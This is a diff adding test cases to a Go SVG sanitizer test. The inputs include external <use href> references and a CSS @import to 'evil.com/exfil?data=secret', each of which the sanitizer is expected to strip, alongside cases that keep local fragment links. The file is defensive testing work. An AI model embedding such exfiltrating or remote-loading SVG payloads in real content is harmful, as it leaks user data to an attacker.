@@ -530,6 +530,11 @@ func TestSanitizeSVG(t *testing.T) {
 			shouldStrip: "evil.com",
 		},
 		{
+			name:        "external use href SVG2",
+			input:       `<svg><use href="https://evil.com/sprite.svg#icon"></svg>`,
+			shouldStrip: "evil.com",
+		},
+		{
 			name:        "style block stripped",
 			input:       `<svg><style>@import url(https://evil.com/exfil?data=secret)</style><rect/></svg>`,
 			shouldStrip: "<style>",
@@ -548,6 +553,21 @@ func TestSanitizeSVG(t *testing.T) {
 			name:        "animateTransform stripped",
 			input:       `<svg><animateTransform attributeName="transform" type="rotate" from="0" to="360"/></svg>`,
 			shouldStrip: "<animateTransform",
+		},
+		{
+			name:        "preserves local use xlink:href",
+			input:       `<svg><use xlink:href="#myGlyph"/></svg>`,
+			shouldStrip: "",
+		},
+		{
+			name:        "preserves local use href SVG2",
+			input:       `<svg><use href="#gradient1"/></svg>`,
+			shouldStrip: "",
+		},
+		{
+			name:        "external use href single-quoted",
+			input:       `<svg><use href='https://evil.com/sprite.svg'/></svg>`,
+			shouldStrip: "evil.com",
 		},
 		{
 			name:        "preserves safe SVG",
